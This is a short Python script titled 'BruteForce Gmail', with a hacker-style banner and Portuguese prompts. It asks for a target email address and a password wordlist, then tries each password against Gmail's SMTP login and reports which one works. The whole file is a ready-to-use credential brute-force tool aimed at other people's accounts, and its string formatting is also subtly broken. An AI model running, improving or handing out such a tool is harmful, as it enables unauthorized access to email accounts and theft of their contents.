#BruteForce Gmail
import smtplib
print("""\033[1;31m
  ____    ______    _____                       _        _____         
 |  _ \  |  ____|  / ____|                     | |      / ____|        
 | |_) | | |__    | |  __   _ __ ___     __ _  | |     | |       _   _ 
 |  _ <  |  __|   | | |_ | | '_ ` _ \   / _` | | |     | |      | | | |
 | |_) | | |      | |__| | | | | | | | | (_| | | |  _  | |____  | |_| |
 |____/  |_|       \_____| |_| |_| |_|  \__,_| |_| (_)  \_____|  \__, |
                                                                  __/ |
                                                                 |___/ 
Coder > ejr_geek
GitHub > github.com/ejrgeek | BFGmail.Cy v2.0
\033[0;0m""")
servidor=smtplib.SMTP("smtp.gmail.com",587)
servidor.ehlo()
servidor.starttls()

email=input("\033[1;34mEMAIL > \033[0;0m")
wordlt=input("\033[1;34mSua WordList > \033[0;0m")

wordl=open(wordlt, "r")

for passwd in wordl:
    try:
        servidor.login(email,passwd)
        print("\033[1;34m[♚] Senha Encontrada > %s \033[0;0m") %passwd
        break
    except:
        print("\033[1;31m[♙] Falha > %s \033[0;0m") %passwd
